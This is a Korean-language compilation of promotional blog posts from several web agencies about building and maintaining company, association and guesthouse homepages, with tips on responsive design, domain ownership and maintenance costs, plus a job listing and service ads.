과거와 달리이제는 PC와 모바일 화면을 모두 지원하는반응형으로 제작하는 게 필수가 되었습니다.​PC버전과 반응형의 차이를궁금해하는 분들이 계실 텐데,저희가 실제 제작한협회 홈페이지를 예시로 보여드리겠습니다.​ PC에서 접속했을 경우​기본 PC화면입니다.PC 해상도에 맞게 화면이 보여지죠.하지만 이 화면이 그대로모바일에 보여진다면 홈페이지의텍스트나 사진을 제대로 확인하기 어렵겠죠.​그래서 반응형을 적용하는 것인데요.모바일로 접속했을 때는 아래처럼 보여집니다.​ 모바일에서 접속했을 경우​사용하는 모바일 디바이스 가로 크기에 맞게화면이 저절로 조절되므로홈페이지 내용을 확인하는 데 무리가 전혀 없죠.​저희 홈페이지제작.kr은기본적으로 반응형을 적용해드리기 때문에PC버전 제작 비용만으로PC/모바일 모두 이용 가능한홈페이지를 제작할 수 있습니다 :)​이왕 협회홈페이지를 제작할 계획이라면,반응형 적용 시 저희처럼 추가 비용을 받지 않는업체를 찾아보시는 걸 추천드립니다^^​  ​ 도메인은 협회 명의로​도메인은 홈페이지의 주소라고 할 수 있습니다.가령 www.홈페이지제작.kr 은 저희 업체 홈페이지의 도메인인데요.도메인 등록 시 소유자를 꼭! 협회 명의로 두시기 바랍니다.일부 업체는 업체 명의로 도메인을 구매하는데이런 경우 해당 업체와 거래가 끊기게 되면소유권 문제가 발생할 수 있습니다.나쁜 경우 도메인을 사용할 수 없게 되니도메인 소유자 명의를 반드시 체크하시기 바랍니다.​  ​ 유지보수는 어떻게?​홈페이지를 제작했다면제작 이후 어떻게 되는지도 알아야 하는데요.홈페이지 관리가 가능한 인력이 없다면일반적으로 전문 유지보수 업체에 관리를맡기는 경우가 많습니다.​제작 업체를 통해 유지보수를 이어가기도 합니다^^​여기서부터 중요한데,제작비용 결제 시 유지보수 비용 포함 여부를꼭 확인하시기 바랍니다.​제작비와 함께 유지보수 비용을 결제하면,제작 업체 / 유지보수 업체 별도로 진행하고 싶어도제작 업체에서 유지보수까지 의무적으로 진행해야 합니다.​되도록 제작 이후에 유지보수 여부를선택할 수 있는 업체와 진행하시는 게 좋습니다.​아울러 유지보수 비용 안에호스팅 비용이 포함되었는지도확인하시는 것이 좋습니다.유지보수 비용 따로, 호스팅 비용 따로결제 받는다면 비용 부담이 커지기 때문입니다.​저희 업체의 경우에는 유지보수 비용 안에호스팅 비용까지 포함되어 있습니다^^​  ​ ​협회/조합 홈페이지제작 꿀팁을영상으로도 짧게 정리하였으니 복습해보시기 바랍니다^^​  ​ 전국 언제 어디서나홈페이지제작 문의는1661-5668온라인 바로 문의도 가능합니다.http://xn--hu5b4brvf8c73w61d.kr/bbs/write.php?bo_table=consulting 제작상담하기 글쓰기 | 홈페이지제작 is 홈페이지제작.kr홈페이지제작업체, 반응형, 1000여 고객사, 10년이상 노하우,xn--hu5b4brvf8c73w61d.kr ​​홈페이지제작.kr포트폴리오 확인하기(클릭)​​ 아이코리아비즈서울특별시 서초구 양재천로23길 23 홍우빌딩 402호 ​ 홈페이지를 오래사용하기 위해서는 어떤 조건이 필요할까요?  우선 원하시는 때 언제든 수정이 가능해야 합니다.홈페이지는 매체 특성상 수정되는 부분이 자주 생길 수 있습니다.수정부분이 생길 때 바로바로 수정이 불가능하다면 홈페이지를 오래 사용할 수 없겠죠? 다음으로 관리하시는분 방문하시는 분 모두 마음에 들 수 있는 높은 퀄리티의 홈페이지 입니다.홈페이지에도 트랜드가 존재하고, 디자인퀄리티가 존재합니다.관리하시는 분이 편리하도록 기능구현이 되어 있고, 디자인이 세련되어야 홈페이지를 오래사용할 수 있습니다.  - 넷투넷 위 조건을 충족시키는 제작방법은 어떤것일까요?바로 맞춤형 홈페이지입니다. 맞춤형 홈페이지는 독립형으로 제작하여 고객님들께 온전히 드리는 형태이기 때문에 원본소스도 제공해드려 언제든지 수정이 가능합니다.또, 고객님이 제작하시려는 홈페이지의 컨셉을 말씀해 주시면 디자인,색감 등을 홈페이지에 반영해 드릴 수 있기 때문에 퀄리티 또한 높습니다.​​ 홈페이지제작, 이제 망설이지 마시고 맞춤형으로 진행하세요^^ 홈페이지제작 전문업체 (주)지앤글로벌*감각디자인www.gnglobal.co.kr ◀ 온라인상담문의전화 : 02-523-2825많은 문의 부탁드립니다. ​안녕하세요.​저희는 (주)지앤글로벌(감각디자인)입니다.​많은 건축, 건설뿐 아니라 다양한 업종의 기업에서 홈페이지 상에서 포트폴리오를 통해 기업 홍보를 합니다.​그렇다면 홈페이지에서 어떻게 포트폴리오를 관리하는지 ​저희 감각디자인에서 제작한 홈페이지를 살펴보며 이야기 해볼까요?​​​​  ​기본적인 포트폴리오의 경우 해당 사진과 제목 등을 노출시켜 여러 리스트를 보여줍니다.​물론 맞춤형 홈페이지의 경우에는 이런 리스트 형식을 의뢰인의 요구에 맞게 디자인이 가능합니다.​보통은 이미지만을 노출시켜 포트폴리오 리스트를 한번에 확인할 수 있게 배치합니다.​  ​​포트폴리오 클릭 시 상세 페이지로 이동하여 ​해당 포트폴리오의 상세 이미지, 설명을 노출합니다.​물론 기업마다 포트폴리오의 종류가 다르다보니 이미지를 더 많이 노출하기도,​설명을 더 많이 노출하기도 합니다.​따라서 어떤 것이 더 중요한지 미리 생각해둔다면 원활한 홈페이지 제작이 가능하겠죠?​​​  ​포트폴리오뿐 아니라 공사 실적이나 기타 실적같은 경우에는 ​위 사진 처럼 게시판 형태로 배치하는 것도 가능합니다.​포트폴리오를 어떤 식으로 나타내면 좋을지 잘 모르겠는 경우에는​동종업계나 타 업계의 홈페이지를 살펴보신 후 참고할만한 사이트를 메모해두고​제작 업체에게 문의하시는 것이 좋습니다.​​     ​​저희 감각디자인은 따로 관리자 모드를 세팅해드려 비전문가들도 ​쉽게 포트폴리오를 등록, 관리하실 수 있게 제작해드리고 있습니다.​물론 관리자 페이지를 어떻게 이용하는지 사용방법에 대해서도 알려드리니​누구나 쉽게 홈페이지를 관리하실 수 있습니다.​​   ​​​저희 (주)지앤글로벌(감각디자인)은 18년 경력과 노하우로 다양한 홈페이지를 제작해오고 있습니다.​저희 감각디자인 홈페이지에 방문하시면 더 많은 홈페이지 포트폴리오를 감상하실 수 있는 것은 물론,​온라인, 유선 문의가 가능하며 수도권 지역에 계신 경우 직접 방문으로 드려 ​자세하고 꼼꼼하게 홈페이지 제작 상담 진행을 도와드립니다.​홈페이지 제작에 궁금하신 사항이 있으시다면 언제든 연락주시기 바랍니다.​감사합니다.​​  ​ (주)지앤글로벌-감각디자인홈페이지 제작 전문업체, 기업 및 쇼핑몰 구축, 웹호스팅, 견적 등 상담 안내.www.gamgakin.com ​ [용인] 홈페이지 관리사원 채용  모집부문 모집부문담당업무 및 자격요건회사홈페이지 관리- 담당업무:  상품등록,송장출력 및 사무보조근무조건근무기간 : 장기근무자 우대근무요일 : 월~금근무시간 : 09:00 ~ 18:00 급여 : 월급 160만원 / 중식제공복리후생 : 국민연금,고용보험,산재보험,건강보험,연차,정기휴가,퇴직금,야간근로수당지원조건성별 : 무관연령 : ~35세학력 : 학력무관우대조건 : 인근거주자우대지원조건도 꼼꼼히 살펴보시고 해당 채용공고에 관심이 있으시다고 하시면지원 전 참고사항 읽어보시고 ay0830@kr-job.com 로 해당공고 제목 + 연락처 첨부된 이력서를  보내주시면 됩니다.​ ​기타 문의사항이 있으시다면   전문아웃소싱업체케이알잡​​Tel 1800-4015​FAX 050-7705-2016​​번호를 이용해 주시기 바랍니다! 다음에 또 좋은 일자리로 찾아뵙겠습니다!지금까지 케이알잡이었습니다!   네이버 블로그는 맞지만, 확인불가홈페이지관리 전문사이트인 웹아웃소싱 www.weboutsourcing.co.kr 홈페이지에서는 공지사항 및 자료실의 일부를 미투데이,트위터 등과 연동하였습니다.미투데이 아이디 : eztake 트위터 아이디 : master@eztake.com 입니다. 페이스북, 요즘은 추후 공지하겠습니다.사용하시는 고객여러분들과 다양한 방법의 소통과 의견수렴을 할예정이오니 많은 참여?? 친구추가 부탁드립니다.^^홈페이지관리 사이트 추천! 도메인,호스팅무료제작.HTML5 모바일디자인 상담★ 안녕하세요 잇님들~ 반가워요 :) 잘 지내셨나요?? 오랜만에 찾아왔는데 벌써 가을이네요!이번주 한주가 지나면 이제 정말 8월도 끝이고! 가을과 9월이 함께 시작하면서 리셋이 되는기분이랄까요~ 한주 마무리 잘 하시고 마지막 여름도 시원하게 보내시길 바랄게요 ♡ 제가 지인이 하는 사업을 좀 돕게 되었는데~ 홈페이지를 관리하고 맡아달라고 하더라고요!저는 잘 하진 못하지만 그래도 전문업체의 도움을 받으면 좋을 것 같기도 해서 요기조기알아보던 중에 괜찮은 홈페이지관리 업체가 있어서 잇님들께도 공유를 해드릴까 해요!제가 아래 사이트링크 통해서 링크를 첨부해드릴 텐데요~_~쇼핑몰이라던지 각종 홈페이지를 제작하고 웹호스팅, 검색엔진 등록 대행도 해주면서리모델링 디자인도 해주는 곳을 소개해드릴 테니 아래 링크 참고하셔서 원하시는 정보 얻어보세요♡홈페이지관리 자세하게 살펴볼까요?  예전보다 인터넷 속도가 빨라지고 한인들의 인터넷 사용이 늘어나면서 업체나 단체들이 네티즌들을 끌어들이려 홈페이지를 제대로 관리하려 기획하지만 비용부담과 전문가나 담당인력 부족으로 관리가 어렵다고 하소연하는 업체가 많다. 인터넷마케팅업체 GIG(General Inetlligentce Group의 정성목(사진)대표는 “업주들이나 단체장들이 홈페이지 활용에 대한 기본적인 투자마인드는 있지만 투자 대비 효과에 대해 부정적으로 생각한다”고 말했다. 한번 방치된 홈페이지를 다시 활성화시키려면 시간과 비용을 투자해야 한다. 또한 장기적인 계획을 가지고 홈페이지관리와 홍보, 검색사이트 이용 등이 필요하다. 정대표가 추천하는 홈페이지 관리법은 첫째로 사진이나 업계소식 그밖에 사소한 것이라도 매일 새로운 정보로 홈페이지를 업데이트해 방문자들의 호기심을 자극해야 하는 것. 네티즌들이 명함이나 메뉴에 있는 홈페이지를 기껏 방문해도 오래된 사진과 정보가 홈페이지 대문에 있어 오히려 찾아온 방문객을 쫓아내는 부정적인 작용을 하는 경우가 많다. 두번째는 구글, 네이버, 야후 등 검색사이트에 자신의 홈페이지가 자주 노출될 수 있도록 ‘검색 키워드’를 자주 바꿔주고 업데이트를 하면 좋다. 대부분의 검색사이트들은 업체의 홈페이지를 등록할 때 5~10개의 키워드를 요구한다. 따라서 네티즌들이 인터넷 검색시 자주 사용하는 단어를 홈페이지에 많이 표현될수록 검색시 상위에 노출되게 된다. 정대표는 “최근 네티즌들이 자주 사용하는 검색단어 리스트가 매달 업데이트 된다”며 “통계를 보고 빠진 단어나 유행하는 단어를 이용하면 홈페이지를 더욱 유명하게 만들 수 있다”고 설명했다. 정대표는 마지막으로 “인터넷마케팅은 지속적으로 시간과 비용을 투자가 이뤄져야 한다”이라며 “업주들의 마인드변화가 가장 중요하다”고 강조했다. 이어서 정대표는 “한 인터넷 쇼핑몰의 경우 네티즌들에게 알려지기까지 6개월간 수입 없이 묵묵히 투자한 결과 현재는 초기당시보다 매출이 10배 가까이 뛴 경우도 있다”라고 말했다. GIG는 홈페이지 설계 및 개발은 물론 관리를 대행해주며 업주들이 주, 월 단위로 정보를 GIG에 주면 홈페이지를 관리해주며 필요한 경우 업체의 마케팅플랜을 세워준다.  비용은 필요 프로그램 및 원하는 홈페이지 및 관리방법에 따라 천차만별이며 홈페이지 관리 및 업데이트 비용은 저렴한 편으로 매월 100달러부터 시작한다. ▷문의: (213)388-4541★투잡사업  영업아님 엄청난사업 ★         ▶노하우제공/홈페이지제공 관리만 하세요~  ▶창업비용 49만원~(월수익 3백만원)    ※홈페이지>> http://www.asbb.kr)                「비에스」  (사번:148-11-00730) 상세문의>> ☎ 010-7749-0085   개인홈페이지 회사홈페이지 관리 보수 대행해드리고 있습니다.개인홈페이지관리보수 회사홈페이지관리보수 대행해드립니다. 홈페이지는 유지관리는 상당히 중요한 부분을 차지하고 있습니다.그렇지만 어떻게 홈페이지관리 홈페이지보수는 어떻게 해야 할 지 고민이신가요?그렇다면 여깁니다. 가격이 비싸거나 가격이 저렴한 업체들이 있지만 그 중에서도 가장 저렴합니다. 저렴한 가격에 홈페이지관리 홈페이지보수 받아보세요.  2주일에 5천원으로 여러분의 힘들었던 시간들을 덜 수 있게 노력하겠습니다.   최소 2주일입니다. 연장을 가능하오니 참고바랍니다.하지만 기간을 연장할 시에는 +a가 생깁니다.  기간연장 2주일->1달 : +1만원기간연장 2주일->3달 : +3만원기간연장 2주일->5달+1달 : +5만원 개인홈페이지부터 단체홈페이지 중소기업 홈페이지까지 관리 해드립니다.게시판에 광고글이 올라오는 즉시 바로 삭제 해드립니다. 이제 관리는 여기에 맡기시고 머리 아파 하지 마세요제가 힘이 되어 드리도록 하겠습니다.     ﻿  ﻿ 개인홈페이지 회사홈페이지 관리  보수 해주는 재능보기﻿  [펜션홈페이지관리]펜션홈페이지 관리방법 5가지홈페이지에 많은 돈을 들여 만들고 게시판 답변과 예약만 관리하고 광고에만 신경쓰고 홈페이지 관리는 하지 않는 펜션주가 의외로 많다. 기본이지만 다시 한 번 점검해보자.   1.계절에 맞춰서 메인화면 사진을 변경하자.우리나라만큼 사계절이 뚜렷한 나라가 드물다고 한다. 펜션홈페이지 메인화면은 펜션의 얼굴이다. 계절에 맞게 사진변경을 해주면 방문고객에게 좋은 이미지를 줄 수 있다. 봄에도 겨울설경사진이 메인화면에 돌아가는 경우를 간혹 본다. 어떤 특별한 의도가 없다면 메인화면은 계절에 맞추어서 변화를 주자. 봄에는 꽃이 피는 펜션사진이나 주변수목원사진, 여름에는 바다. 수영장. 계곡사진, 가을에는 단풍사진이나 가을을 느낄 수 있는 사진을, 겨울에는 스파.따뜻한느낌의객실사진.설경사진등이 좋다. 홈페이지를 만든 업체에 전화해서 메인사진을 변경해달라고 하면 별도 비용 없이 변경이 가능한경우가 많다. 펜션을 오픈한지 얼마 되지 않아서 사진이 없는 경우는 펜션외부 사계절 사진을 꼭 촬영해 놓도록 하자.     2.공지사항을 1주일에 1건 이상 올리자.펜션홈페이지를 들어가 보면 공지사항을 꾸준히 올리는 곳은 대부분 예약률이 좋은 곳이다.어떻게 어떤 글을 올려야할지 잘 모르겠다는 분들을 위해 몇 가지 방법을 추천하면 첫 번째, 지역홈페이지를 즐겨찾기 해놓고 정보를 옮겨오자.지역축제.관광포털.문화예술회관.여행지홈페이지.박물관.미술관등 지역행사를 알 수 있는 다양한 홈페이지를 즐겨찾기에 넣어놓고 일주일에 한번이라도 꼭 방문해서 각종 이벤트 및 행가가 있는 내용 중 펜션에 도움이 되는 정보들을 복사해 와서 공지사항에 넣으면 된다. 글을 올릴 때 복사해서 그대로 붙여넣기 보다는 펜션주의 생각을 조금만 넣어서 글을 다듬으면 고객들에게 아주 유용한 정보가 된다. 만약 축제정보를 넣을 경우 웹문서검색에서 게시판검색도 되어 마케팅에도 도움이 되어 1석2조의 효과를 볼 수가 있다. 두 번째, 오늘의펜션풍경도 정보가 된다.정말 올릴 것이 없다면 이른아침펜션풍경 사진 한컷 찍어서 내용을 첨가해서 올리면 오늘펜션에대한 정보가 될 수 있다. 고객은 펜션주의 사소한 배려에 감동한다.    3.질문과 답변 게시판은 매일매일 체크하자.게시판에 질문이 올라왔다면 당일답변을 원칙으로 하자. 고객은 질문을 해놓고 수시로 답변을 기다리며 클릭을 한다.  하루가 지나도록 답변이 없으면 전화로 문의를 하는 경우보다 성의 없음에 다른 곳으로 이동하는 경우가 더 많다는 것을 명심하자.질문 글에 답변이 없는 경우 다른 고객들에게도 좋은 이미지를 남기지는 않는다.    4.포토앨범에 사진을 자주 올리자포토앨범에 사진을 자주 올려주는게 좋다. 펜션이 하루하루 달라지는 모습들을 담아내는 생동감은 고객으로 하여금 좀 더 홈페이지에 머물러 있게 한다. 볼거리가 많아야 고객은 정보를 얻기 위해서도 더 많이 홈페이지에 머물러 있으며 이 시간이 예약으로 연결되는 경우가 많다. 꼭 펜션풍경이 아니어도 펜션주변의 여행지 사진도 좋다. 살아있는 느낌이 중요하다.   5.온라인에서 펜션 악글이 있는지 가끔씩 검색해보자.간혹 갑자기 펜션 예약률이 저조해졌어요. 라는 말을 들을 때가 있는데 이 경우 간혹 악글이 인터넷에 유포되어 있는 경우가 있다. 펜션을 머물다 가신 고객에게 최선을 다해서 서비스를 해야 하는 것이 기본 원칙이지만 간혹은 매너가 없는 고객이 있을 수도 있고 이 경우 악글로 이어진다.  검색에서 펜션이름을 검색해보고 악글이 있나 검토해보고 만약 있다면 글을 올린 고객과의 소통을 먼저 해서 해결 방법을 찾아야한다. 해결방법을 잘 모를 경우 홈페이지 관리 업체에 상담을 요청해도 된다.   이상 다섯 가지 홈페이지 기본관리 요령이다.기본이지만 지켜지지 않는 경우가 많아 다시 한 번 강조하며 예약률을 올리기 위해서는 우선 기본에 충실해야 하는 것을 잊지 말자.  글쓴이 : 오컴즈 대표 오경자               [홈페이지제작/관리]_신우산업 홈페이지제작          안녕하세요? 감각디자인입니다.여러분들께 보여드릴 홈페이지는 바로 '신우산업'이라는 회사의 홈페이지입니다.   자사가 제작한 홈페이지 인데요.  에폭시, 우레탄, 접착제등을 제조하는 회사입니다^^그럼 저희가 어떤식으로 홈페이지를 제작했는지, 한번 보러가실까요?ㅎㅎㅎ       1. 메인화면  메인화면을 통해서 알 수있듯, 바닥제, 접착제등을 제조하는 업체이기 때문에메인화면에 업체의 특성을 고스란히 나타낼 수 있는 화면으로 구성하였습니다.  그리고 무엇보다도 '친환경'을 비전으로 삼고 있으셨기 때문에문구등으로 강조를 시켜드렸습니다^^      2. 인사말 페이지  인사말 페이지는 메인화면 다음으로 아마 홈페이지 방문자가 접하는 페이지 일텐데요.깔끔하고 가독성 높인 디자인으로 퀄리티를 높여보았습니다.       3. 제품소개  제품을파는 회사의 홈페이지는 제품소개가 무엇보다도 중요합니다.홈페이지를 통해서 제품을 홍보하는 것이 아마도 가장 큰 목적일테니 말입니다^^ 신우산업 홈페이지의 경우, 제품은 직접 등록 가능하도록 개발 작업을 해드렸습니다.개발과 디자인의 차이는 무엇인가? 물어보신다면말 그대로 개발을 해드리면, 추후에 제품이 추가되거나 수정이 필요하실땐 직접 컨트롤을 하시는 방식이구요.디자인을 해드리면 저희가 제품사진과 문구를 이쁘게 디자인 해드리는 방식입니다.  두가지 방식은 각각의 장단점이 모두존재하는데요.저희가 봤을땐 아마 제품 출시주기가 잦으시다면 거의 개발쪽으로 가셔서 직접 컨트롤을 하시는 경우가 많습니다^^  이부분은 저희와 미팅을 통해서 협의를 하시면 될 것 같습니다. 아무튼 저희는 직접 개발이 가능하기 때문에어떤 방식이든 구현을 해드릴 수 있습니다^^     4.시공사례  지금 보시는 페이지는 시공사례 페이지인데요.에폭시와 접착제등을 활용한 사례들을 고객들에게 제공한다면그 제품에 대한 신뢰도는 더욱 더 커질 것 입니다^^ 이런 사례제공은 다른시각으로 봤을땐 실적사례라고도 할 수 있겠죠?ㅎㅎㅎㅎ    기업/회사 홈페이지 제작을 하실땐최대한 업체의 특성과 제품의 특성을 나타낼 수 있도록 제작해드리고 있습니다.    이것이 바로 맞춤형 홈페이지 제작의 큰 장점입니다!제작 완료 후에도 고객 만족도 또한 높고 이런 높은 고객만족도는꾸준한 홈페이지 관리 운영으로도 이어질 수 있습니다!    홈페이지는 제작도 중요하지만, 제작 완료 후 어떻게 관리하느냐도 매우 중요하답니다^^   회사/기업 홈페이지 제작은 자신있습니다.저희 지앤글로벌(감각디자인)으로 문의 주세요^^ 서울, 경기 지역은 방문 미팅 가능합니다.  ■온라인 문의 : www.gamgakdesign.co.kr■전화문의: 02-523-2885        홈페이지 관리를 하면서 답답한 경우 있죠 제일 잘안되는 부분이 게시판 관리 인것 같습니다.일단 게시글 수가 적으면 게시판 운영의 실패인것 처럼 보이고 사이트가 죽은것 처럼 보입니다게시글이 많지 않을경우는 작성 날짜를 빼는게 오히려 낫고 조회수도 많지 않으면 빼는것이 좋습니다.만약 게시판이 여러개여서 관리 안되는것 보단 한 게시판을 잘 관리하는게 좋습니다운영자 관리자가 정확히 없을때는 게시판이 없는것이 좋을수도 있습니다. 홈페이지는 주인보다는 방문자의 입장에서 많이 맞춰서 운영하셔야 합니다.어차피 주인 좋으라고 만든다기 보단 방문자가 좋아야 또 방문하니까요하지만 제작 당시 대부분 주인 맘에 좋은 홈페이지로 제작을 하고 운영도 안될 상황인데 무리하게 기획을 하는경우가 많습니다처음부터 작게 시작해서 점점 키워나가는 홈페이지라야 효과도 보고 성장도 됩니다하지만 처음부터 그럴듯하게 만들었지만 관리와 운영이 안되어서 빈집처럼 혹은 폐허가 되는 경우가 많으니 주의해야 합니다 관리와 운영에 대해 궁금한 사항들 있으시면 문의주세요언제든 친절히 내 사이트 처럼 상담해 드립니다  홈페이지수정/홈페이지관리/홈페이지유지보수문의​​홈페이지를 수정하기 위해서는 홈페이지 정보가 있어야 합니다. 원본소스가 있는지, FTP정보가 있는지 알아보아야 하는데요~ 탬플릿으로 제작한 경우 원본소스를 보지 못하도록 막아놓는 경우가 많아 수정이 어려울 수 있습니다.때문에 초기 제작부터 수정이 가능한 맞춤형 홈페이지를 추천해 드리는데요~  맞춤형 홈페이지는 원본소스가 보관되어 있기 때문에 필요할 때 마다 언제든지 수정이 가능합니다.탬플릿형은 차후에 프로그램추가 수정이 거의 불가능하기 때문에 오래사용하기 힘들 수 있습니다. 홈페이지 수정은 디자인적, 기능적 수정이 있을 수 있고 링크연동 버튼 등이 생길 수 있습니다.홈페이지 수정 관련하여 궁금하신 사항이나 견적을 받아보고 싶으신 분들은아래 번호로 문의주시거나 상담글 남겨주세요^^ -------------------------------------------------------------------------------------------​-------------------------------------------------------------------------------------------네이버 블로그는 맞지만, 확인불가튼튼하게 잘지은 집도 관리와 보수를 하지 않고 방치하게 되면 낡고 망가지게 됩니다.  홈페이지 또한 마찬가지입니다.홈페이지가 제작되고 나서 꾸준한 운영과 관리(유지보수)가 이뤄지지 않으면홈페이지를 접속하는 소비자들은 휴먼상태로 홈페이지를 인식하게 되고이는 기업의 이미지와 인지도, 호감도에 상당부분 부정적인 영향을 끼치게 됩니다. 대부분의 고객들이 홈페이지제작을 하는 단계에서홈페이지를 한 눈에 보여줄 수 있는 기획과 구성에만 신경을 쓰고 홈페이지 제작이 완료된 후의 유지보수,즉 운영과 관리를 어떻게 하느냐는 간과하시는 경우가 많은데홈페이지의 운영과 관리(유지보수)는 홈페이지제작만큼 굉장히 중요한 부분입니다. 대부분 홈페이지 제작만 하면 알아서 홈페이지마케팅이 진행이 되고 효과가 나타날거라 기대를 하고 홈페이지 유지보수에는 신경을 쓰지 않고 손을 놓는 경우가 많은데요,   결론부터 말씀드리면 홈페이지의 꾸준한 운영과 관리가 이뤄지지 않으면  오히려 제작된 홈페이지는 기업에게 독이 될 수도 있습니다. 업체에 대한 호감과 정보를 취득하고자 홈페이지에 접속한 소비자가  운영과 관리가 이뤄지지 않은 업체의 홈페이지를 접하게 될 경우, 소비자는 휴먼 홈페이지를 접하고 해당 업체에 부정적인 이미지를 갖게 됩니다.  그럼, 홈페이지제작 후 홈페이지 운영관리를 어떻게 해야만 하는걸까?.... 고민이 많은신 분들을 위하여 간단하게 정리해 보도록 하겠습니다. 우선 개인이 홈페이지를 운영하고 관리(유지보수)를 한다는 것은 현실적으로 많이 번거로울 뿐만 아니라 어렵습니다. 홈페이지 운영과 관리(유지보수)를 위해서는 홈페이지제작의 최종본의 소스 버전관리와 이미지 원본 파일관리, ftp 계정 및 각 카테고리별(메뉴별) 파일 관리는 필수이기 때문입니다.﻿ 위의사항을 체계적으로 관리해줄 홈페이지 관리 업체를 홈페이지제작을 할 때부터 미리 염두에 두고 ﻿﻿제작부터 운영, 관리(유지보수)가 한번에 이뤄지는 홈페이지제작 업체를 선정하시는 것이 좋습니다.﻿﻿ ﻿ 홈페이지는 만드는 사람의 스타일에 따라 프로그램되어 만들어지기 때문에 본인이 제작한 홈페이지는 쉽게 수정하고 변경이 가능하지만 외부에서 만들어진 홈페이지를 변경하려고 하면 위에서 나열한 홈페이지제작 최종본의 소스 버전, 적용된 프로그램과 시스템, 이미지 원본 파일, ftp 계정 등에 대한 조사와 분석이 필요하기 때문에 그만큼 시간이 소요되고 진행한 작업에 대한 비용이 추가 발생하게 됩니다.  ﻿﻿  ﻿ 또한 홈페이지는 제작 시작 단계부터 홈페이지의 운영과 관리(유지보수)를 생각하고 제작을 하셔야 합니다. ﻿﻿ 저렴한 비용으로 홈페이지를 제작하는 경우 홈페이지의 운영과 관리(유지보수)나 리뉴얼이 안되는 경우가 많으며이는 결국 새로운 홈페이지를 제작하게 되는 악순환으로 연결,기간과 비용의 낭비만 가져오게 됩니다.  마지막으로 홈페이지제작시 업체를 선정할때 가장 중요한 것은 피드백이 바로 이뤄질 수 있는 곳입니다.우후죽순처럼 생겨나는 수많은 홈페이지제작 업체들 중저렴한 가격과 짧은 기간만 보시고 홈페이지제작 업체를 선정하시는 경우가 많으신데이는 후에 홈페이지 운영과 관리(유지보수)를 할 때 부메랑이 되어 날아올 수 있습니다.피드백이 바로 이뤄지지도 않을 뿐더러 어떤 곳은 회사가 없어져서 아예 연락이 안되는 곳도 허다하기 때문입니다. ﻿ 체계적으로 홈페이지제작이 이뤄지고 피드백이 바로 가능한 신뢰가 가는 홈페이지제작 업체를 선정하셔야 효율적인 홈페이지 운영과 관리(유지보수)가 이뤄질 수 있으며홈페이지 마케팅으로 연결이 되어 업체의 매출증대에 기여할 수 있습니다. ﻿﻿ www.jnpcom.co.kr 제작부터 운영, 관리(유지보수)까지 해야할 일도 많고 갈 길도 먼 것만 같은 홈페이지,그러나 고객과 함께 생각하고 고객이 원하는 바를 실현시켜 줄 수있는 기술을 보유한든든한 파트너가 있으면 손쉽게, 그리고 효율적으로 홈페이지를 만들 수 있습니다. 홈페이지제작과 웹사이트 개발,젊은 기업 "제이엔피 커뮤니케이션"이든든한 파트너가 되어 드리겠습니다.  ​  부산홈페이지제작 부산 회사 이벤트 가격으로 지원받기! TEEMER기획 010-8887-3215안녕하세요- #부산홈페이지제작 회사#티머기획 입니다 ^^ 많은 분들이 온라인을 통해다양한 방법으로 마케팅을 진행하고 있는데요-​특히나 지금은 온라인 마케팅을 빼고는생각할 수 없을 정도로 많은 곳에서 온라인마케팅에대해 많은 방법을 제시하고 실행을 하고 있습니다.​매출증대에 막대한 영향을 끼치기도 하고,오프라인 광고 보다는 투자비용이 적기 때문에병원, 프랜차이즈, 중소기업, 대기업, 개인 등많은 분들이 온라인 광고를 필수적으로 하고 계시죠.​매달 검색광고나 유튜브 등 여러 채널을 활용하여광고를 진행하고 있는데, 그럼에도 불구하고결과가 잘 나지 않거나 매출이 그대로라면마케팅방법이 혹 잘못되지는 않았는지 한번체크해볼 필요가 있습니다.​​   ​​이제 막 시작하는 기업의 경우일수록 온라인마케팅은초반에 다양한 곳에서 많이 하시는것이 좋습니다.​하지만, 검색광고나 초반에 여러곳에서 다양한 광고를했고 분명 홈페이지로 유입되는 수는 많은데그에 비해 구매수가 없다면, 홈페이지가 복잡하지는않은지 다시 확인해보시기 바랍니다.​홈페이지까지 끌고 온다고 해도, 홈페이지에정보가 없거나 너무 어렵다면 제대로 이해가 잘되지않을뿐더러 당연히 매출상승까지 이어지는것도사실상 어렵기도 합니다.​​   ​사람들에게도 첫 이미지가 중요한것처럼 기업의얼굴도 마찬가지입니다. 홈페이지는 그 기업의대표얼굴이라고 할수 있을 정도로 무척 중요하죠.​그렇기 때문에 대충 만든 홈페이지가 아닌보다 확실한 홈페이지 작업이 필요합니다.​또한, 최근에는 PC를 통해서 들어오는 수보다모바일을 통해 홈페이지에 들어오기 때문에각각의 환경에 맞는 모습으로 홈페이지가제공되어지면 가장 좋겠죠?​오늘 소개해드리는 티머기획에서는 반응형 모바일홈페이지 구현이 가능합니다.​​   ​​아무리 고퀄리티의 홈페이지를 만든다고 하더라도로딩이 길고, 이미지가 늦게  뜨는 경우에는홈페이지에 들어온 많은 유입자들이 금방 빠져나가는현상이 생기곤 합니다. 특히나 지금같이 5G시대에는이런 일은 있을 수 없겠죠-​심플하게, 빠르게, 정보는 탄탄하게!확실하기도 하고 가성비도 좋은 홈페이지를개발해드리는 티머기획!​특히나 개인사업을 하거나 온라인 마케팅을 통해수익을 내고자 하시는 분들은 홈페이지가 반드시필요합니다.​​   ​​고객들의 경우, 신설 업체를 발견하면 우선은포털사이트에 검색을 해보게 되죠. 리뷰도 좋지만홈페이지의 유무를 통해서 신뢰감이 형성되기도 합니다.​또한 홈페이지 내부에 들어가서 얼마나 관리가잘 되고있는지에 따라서도 안심하기도 하죠-​보다 질이 높은 서비스, 하지만 가격은 합리적으로홈페이지를 만들 수 있는 방법은 티머기획에문의주시면 언제든지 설명해드리고 있습니다.​​    ​​홈페이지는 관리자 모드 역시 쉬워야 한다는 생각입니다.복잡하고 어려워서 사후관리를 제대로 하지 못하는 경우들이상당히 많고, 이를 통해서 시대에 뒤떨어진 퀄리티나괜히 홈페이지 자체가 더 복잡해지는 경우들도 있습니다.​관리자모드 역시 쉽게 운영할 수 있도록 도와드리며,유지 보수 시스템의 전체적인 부분들도 보다 체계적으로관리할 수 있도록 되어있어 보다 만족스럽게홈페이지 관리 운영이 가능합니다!​​   ​홈페이지 제작 후 웹 호스팅, 도메인, 검색등록, 팝업 등다양한 서비스 혜택을 받을 수 있죠- 스마트폰을 더 많이이용하고 있는 시대니 만큼 모바일에서도 자연스럽게환경에 맞춰 열리는것이 무척 중요합니다.​크리에이티브 기술력을 통해 최상의 웹 서비스를제공해드리는 티머기획에서는 무엇보다도 "내 팀"처럼함께 고민하고 우리 업체에 맞는 홈페이지 제작을도와드리고 있습니다.​​    ​부산홈페이지제작 부산 회사, 티머기획에서는현재 이벤트 가격으로 